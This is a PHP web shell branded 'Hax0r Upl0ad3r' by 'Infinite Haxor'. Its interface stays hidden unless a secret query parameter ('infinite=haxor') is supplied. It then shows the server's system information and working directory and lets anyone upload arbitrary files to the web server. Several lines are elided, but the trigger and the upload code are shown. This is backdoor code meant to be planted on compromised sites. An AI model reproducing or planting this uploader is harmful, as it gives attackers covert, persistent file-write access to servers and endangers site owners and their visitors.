<?php
if($_GET['infinite'] == 'haxor') {
echo '<link rel="shortcut icon" href="http://www.stickpng.com/assets/images/58481570cef1014c0b5e496f.png">';
echo'<div class="error">';
echo '<center>';
echo '<br><br><br><br><br><br><a href="http://www.infinitehaxor.com" target="_blank"><img  alt="Infinite Haxor"
src="https://s7.postimg.org/wa6fquaxn/waddogan.png"></a>';
//////////////////
echo '</center></div>';
/*
Original From My Friend Oxan0n
Recoded By Infinite Haxor
https://www.facebook.com/

*/
/////////////////////////
echo '<title>Hax0r Upl0ad3r</title>';
echo'<body style="background-color: silver; color: black;"
alink="#ee0000" link="#0000ee" vlink="#551a8b">';
echo '</center>';
echo '<center>';
/////////////////////////////////////////////////////////////////////////////////////////////////////////
echo '<big><big><span style="color: purple;" border="red solid 2px">Hax0r Upl0ad3r</span></big></big>';
echo '<br><br>';
///////////////////////////////////////////////////////////////////////////////////////////////////////
echo '<big> system -> <span style="color: red;">'.php_uname().'</span> <- system</big><br>';
echo '<big><span style="color: green;">'.getcwd().'</span> <- Directory</big><br><br>';
echo'<div class="error">';
...
if($_POST['upl'] == "upload")
  if(@copy($_FILES['mlf']['tmp_name'], $_FILES['mlf']['name']))
	...
	{echo '<h2><br><span style="color: rgb(192, 0, 0);"> [-] FactorFace ! ^_^ :(</span></h2>';}
///////////////////////////////////////////////////////////////////////////////////////////////////////
echo '</body></div>';
//////////////////
}
...
@import url(https://fonts.googleapis.com/css?family=Iceland);
		body {
		    ...
		    color: black;
		    font-family :'Iceland';
			 background-image:url(https://onehdwallpaper.com/wp-content/uploads/2015/07/Sad-Anime-Girls-HD-Desktop-Wallpapers.png);
 background-size: 100%; 
...
<a href='https://www.facebook.com/nubihaxor' target='_blank'><font size='3px'>About Us</a> - 
<a href='http://www.infinitehaxor.com' target='_blank'><font size='3px'>Alert !!! Click To Read !</a>  - 
<a href='http://nubihaxor-exploiter.ga' target='_blank'><font size='3px'>Exploiter Online</a> 
</body>
</html>
